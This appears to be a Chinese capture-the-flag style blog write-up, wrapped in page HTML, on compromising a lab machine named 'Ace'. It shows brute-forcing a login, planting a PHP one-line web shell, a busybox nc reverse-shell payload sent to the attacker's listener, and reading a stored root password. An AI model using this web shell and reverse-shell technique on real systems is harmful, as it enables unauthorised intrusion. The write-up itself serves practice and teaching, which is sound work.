@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 信息收集与初步探测
+
+老规矩，新开一个靶机，先用 `arp-scan` 扫一下网段，看看新来的邻居是谁。">
+<meta property="og:title" content="内部_Ace">
+<meta property="og:description" content="# 信息收集与初步探测
+
+老规矩，新开一个靶机，先用 `arp-scan` 扫一下网段，看看新来的邻居是谁。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Ace.html">
+<meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
+<title>内部_Ace</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Ace</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/294" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集与初步探测</h1>
+<p>老规矩，新开一个靶机，先用 <code>arp-scan</code> 扫一下网段，看看新来的邻居是谁。</p>
+<pre lang="bash"><code>sudo arp-scan -l
+</code></pre>
+<pre><code>Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
+192.168.205.131 00:0c:29:c3:54:95       VMware, Inc.
+192.168.205.191 08:00:27:06:30:73       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:e0:e2:35       VMware, Inc.
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.999 seconds (128.06 hosts/sec). 5 responded
+</code></pre>
+<p>很快就定位到了目标 IP <code>192.168.205.191</code>。下一步，直接上 Nmap 对它进行全端口扫描，看看开放了哪些服务。</p>
+<pre lang="bash"><code>nmap -p0-65535 192.168.205.191
+</code></pre>
+<pre><code>Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 07:23 -0400
+Nmap scan report for 192.168.205.191
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt
+MAC Address: 08:00:27:06:30:73 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
+</code></pre>
+<p>结果出来了，开放了 22 (SSH)，80 (HTTP) 和 8000 (HTTP-alt)。有 Web 服务，这通常是最好的突破口。先从 80 端口开始看。</p>
+<p>用 <code>curl</code> 简单请求一下 80 端口的首页。</p>
+<pre lang="bash"><code>curl 192.168.205.191
+</code></pre>
+<pre lang="html"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+...
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;quote&quot;&gt;
+            &quot;The only way to do great work is to love what you do.&quot;
+        &lt;/div&gt;
+        &lt;div class=&quot;separator&quot;&gt;-------------------------------------&lt;/div&gt;
+        &lt;div class=&quot;signature&quot;&gt;jiali&lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>返回的是一个心灵鸡汤页面，但页面底部有个签名 <code>jiali</code>。这看起来很像一个用户名，先记下来。</p>
+<p>接着用 <code>dirsearch</code> 扫一下目录，看看有没有什么隐藏的好东西。</p>
+<pre lang="bash"><code>dirsearch -q -u 192.168.205.191
+</code></pre>
+<pre><code>[07:24:48] 200 -  621B  - http://192.168.205.191/login.php
+...
+</code></pre>
+<p><code>dirsearch</code> 跑出了一堆 403，但其中有一个 <code>login.php</code> 引起了我的注意。</p>
+<h1>初始突破</h1>
+<p>访问 <code>login.php</code> 是一个登录页面。我尝试了一些常见的弱口令组合和简单的 SQL 注入payload，都没反应。</p>
+<p>再回头看 8000 端口，访问后发现是一个 Ajenti 控制面板，版本是 2.2.15。查了一下这个版本，没发现公开的 CVE，暂时没思路。</p>
+<p>既然这样，就回到 80 端口的 <code>login.php</code>。我有了之前发现的用户名 <code>jiali</code>，现在缺的就是密码。这种场景，爆破是必须的。我打开 Burp Suite，用 <code>jiali</code> 作为用户名，加载了 <code>rockyou.txt</code> 字典的前 5000 行，对着登录请求开始爆破。</p>
+<p>没过多久，就跑出了一个有效的凭证：<code>jiali:qweasdzxc</code>。</p>
+<p>登录成功了。当80没有任何有用的攻击点，使用该密码富用于8000 Ajenti 成功进入。</p>
+<h1>权限提升</h1>
+<p>Ajenti 面板提供了一个 Web Terminal，这给了我一个 <code>jiali</code> 用户的 shell。我开始在系统里翻找敏感信息。在 <code>/var/www/</code> 目录下，我发现了名为 <code>...</code>文件。</p>
+<pre lang="bash"><code>$ ls -al
+total 16
+drwxr-xr-x  3 root     root     4096 Apr 19 09:49 .
+drwxr-xr-x 12 root     root     4096 Apr  1  2025 ..
+-rw-------  1 www-data www-data   26 Apr 19 09:49 ...
+drwxr-xr-x  3 www-data www-data 4096 Apr 19 09:56 html
+</code></pre>
+<p>这个文件的所有者是 <code>www-data</code>，而我当前的 <code>jiali</code> 用户没有权限读取它。看来需要先拿到 <code>www-data</code> 权限。</p>
+<p>我继续检查文件权限，发现在 <code>/var/www/html/</code> 目录下的 <code>jiali_home</code> 文件夹权限是 777，所有人可读可写可执行。</p>
+<pre lang="bash"><code>$ ls -al
+total 20
+drwxr-xr-x 3 www-data www-data 4096 Apr 19 09:56 .
+drwxr-xr-x 3 root     root     4096 Apr 19 09:49 ..
+-rwxrwxrwx 1 www-data www-data 1674 Apr 19 09:44 index.html
+drwxrwxrwx 2 www-data www-data 4096 Apr 19 09:48 jiali_home
+-rw-r--r-- 1 root     root     2732 Apr 19 09:56 login.php
+</code></pre>
+<p>这简直是白给。直接在这个目录里写入一个 PHP webshell，然后通过浏览器访问来执行命令，获取 <code>www-data</code> 的 shell。</p>
+<p>准备一个简单的一句话木马 <code>cmd.php</code>。</p>
+<pre lang="bash"><code>$ cat cmd.php
+GIF89a;
+&lt;?php 
+if(isset($_GET['a']) &amp;&amp; isset($_GET['b'])) {
+    $a = $_GET['a'];
+    $b = $_GET['b'];
+    $a($b);
+}
+?&gt;
+&lt;?php phpinfo(); ?&gt;
+</code></pre>
+<p>把这个 <code>cmd.php</code> 文件放到了 <code>/var/www/html/jiali_home/</code> 目录下。</p>
+<pre lang="bash"><code>$ pwd
+/var/www/html/jiali_home
+</code></pre>
+<p>先访问 <code>http://192.168.205.191/jiali_home/cmd.php</code>，页面成功显示了 <code>phpinfo()</code>，证明脚本可以执行。同时我也看了一下 <code>disable_functions</code>，发现 <code>exec</code> 函数还能用。</p>
+<p>接下来，在我的 Kali 上开启 netcat 监听。</p>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
+<p>然后构造 payload，通过 web shell 反弹一个 shell 回来。目标机器上有 <code>busybox</code>，用它来建立连接很方便。</p>
+<pre><code>http://192.168.205.191/jiali_home/cmd.php?a=exec&amp;b=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
+</code></pre>
+<p>访问这个 URL 后，我的 nc 监听端成功接收到了反弹 shell。</p>
+<pre><code>listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.191] 42042
+</code></pre>
+<p>现在我已经是 <code>www-data</code> 用户了，可以回头去读那个 <code>...</code> 文件了。</p>
+<pre lang="bash"><code>cat /var/www/...
+</code></pre>
+<pre><code>root:hDLHiKiviqDf5CU55m8D
+</code></pre>
+<p>文件里是 root 用户的密码。</p>
+<h1>获取 Root 权限</h1>
+<p>拿到了 root 的密码，事情就简单了。直接用 SSH 登录。</p>
+<pre lang="bash"><code>ssh root@192.168.205.191
+</code></pre>
+<p>输入刚才拿到的密码 <code>hDLHiKiviqDf5CU55m8D</code>。</p>
+<pre><code>root@192.168.205.191's password: 
+Linux Ace 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Apr 19 10:15:14 2026 from 192.168.3.94
+root@Ace:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功登录，<code>id</code> 命令确认了 root 权限。靶机拿下。</p>
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
